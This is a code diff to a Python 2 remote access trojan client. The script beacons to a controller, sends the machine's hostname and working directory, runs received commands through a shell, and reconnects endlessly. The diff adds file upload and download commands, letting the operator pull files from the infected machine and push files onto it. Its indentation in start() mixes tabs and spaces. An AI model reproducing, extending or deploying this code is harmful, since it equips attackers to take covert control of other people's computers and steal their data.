@@ -8,6 +8,8 @@
 [~] Version: 0.2
 """
 
+END_OF_FILE = "(((END_OF_FILE)))"
+
 from Tkinter import *
 import socket
 import subprocess
@@ -34,7 +36,46 @@ def crypt(TEXT, encode=True):
 def send(data):
     s.sendall(crypt(os.getcwd()))
     s.sendall(crypt(data))
-    
+
+def download(command):
+    fileName = command.replace("upload ", "")
+
+    f = open(fileName, 'wb')
+    while True:
+        l = s.recv(1024)
+        while l:
+            if l.endswith(END_OF_FILE):
+                if END_OF_FILE in l:
+                    # removing END_OF_FILE flag
+                    l = l.replace(END_OF_FILE, "")
+                f.write(l)
+                args = "[+] Upload complete!"
+                s.sendall(crypt(args))
+                break
+            else:
+                f.write(l)
+                l = s.recv(1024)
+        break
+    f.close()
+    main()
+
+def upload(command):
+    fileName = command.replace("download ", "")
+    try:
+        f = open(fileName, 'rb')
+        l = f.read(1024)
+
+        while (l):
+            s.send(l)
+            l = f.read(1024)
+        f.close()
+        s.send(END_OF_FILE)
+        main()
+
+    except IOError:
+        s.sendall("File not found\n")
+        main()
+
 def messageBox(message):
     root = Tk()
     root.attributes('-topmost', True)
@@ -82,6 +123,12 @@ def main():
             info()
             main()
 
+        elif "upload" in command:
+            download(command)
+
+        elif "download" in command:
+            upload(command)
+
         elif "execute" in command:
             command = command.replace("execute ", "")
             subprocess.Popen(command, shell=True)
@@ -104,14 +151,13 @@ def main():
     s.close()
 
 def start():
-	while True:
-		try:
-			connect()
-			send(socket.gethostname())
-			main()
-		except:
-			start()
-
+    while True:
+        try:
+            connect()
+	    send(socket.gethostname())
+            main()
+	except:
+            start()
 
 if __name__ == "__main__":
     start()
